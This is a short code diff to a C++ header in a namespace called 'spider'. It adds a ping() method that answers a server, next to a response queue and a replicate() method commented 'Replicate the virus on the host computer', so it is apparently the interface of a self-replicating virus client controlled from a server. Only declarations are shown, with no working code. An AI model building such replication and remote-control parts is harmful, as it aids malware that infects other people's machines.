@@ -39,6 +39,9 @@ namespace spider
 	// server
 	virtual mt::Queue<std::string> &getReponseQueue();
 
+	// Respond to a ping from the server
+	virtual void ping();
+
 	// Replicate the virus on the host computer
 	virtual void replicate();
 
